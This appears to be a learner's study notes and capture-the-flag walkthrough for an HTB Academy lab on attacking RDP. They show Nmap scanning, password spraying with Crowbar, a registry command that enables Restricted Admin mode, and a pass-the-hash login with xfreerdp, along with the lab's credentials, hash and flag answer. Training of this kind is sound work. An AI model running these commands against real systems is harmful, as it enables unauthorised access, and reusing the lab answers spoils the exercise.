So RDP wasnt in footprinting but i deal with it on a daily with work so im rather familar with it. 

By default, RDP uses port TCP/3389. Using Nmap, we can identify the available RDP service on the target host: - also is a microsoft product so windows only. 

Enumeration Syntax: 

MJBUCKNER@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server

sometimes idk why they throw random tools in here, i get its for password spraying but idk: 

Crowbar - RDP Password Spraying

MJBUCKNER@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

Would rather use Hydra:

We can RDP into the target system using the rdesktop client or xfreerdp client with valid credentials.

MJBUCKNER@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes 

-> i also jsut use xfreerdp for all of these rooms to make it uniformed. 

Syntax: xfreerdp /v:192.168.220.152 /u:lewen /p:Password1 

The rest is really just enumerating the system once youre RDP'd in. 

Challenge: 
- RDP to 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01) with user "htb-rdp" and password "HTBRocks!"

Question 1 -  What is the name of the file that was left on the Desktop? (Format example: filename.txt) - pentest-notes
1) xfreerdp /v:10.129.203.13 /u:htb-rdp /p:HTBRocks!+
2) once logged in we see the file 'pentest-notes' on desktop 


Question 2 -  Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? - hint: Restricted Admin Mode is disabled by default 
1) from the section - DisableRestrictedAdmin 



Question 3 - Connect via RDP with the Administrator account and submit the flag.txt as you answer. - HTB{RDP_P4$$_Th3_H4$#} 
1) in the orginal RDP session run this command: C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
2) operation completed successfully 
3) click on the pentester notes on desktop to get -> Administrator:0E14B9D6330BF16C30B1924111104824
4) xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
5) flag is on admin desktop - HTB{RDP_P4$$_Th3_H4$#}
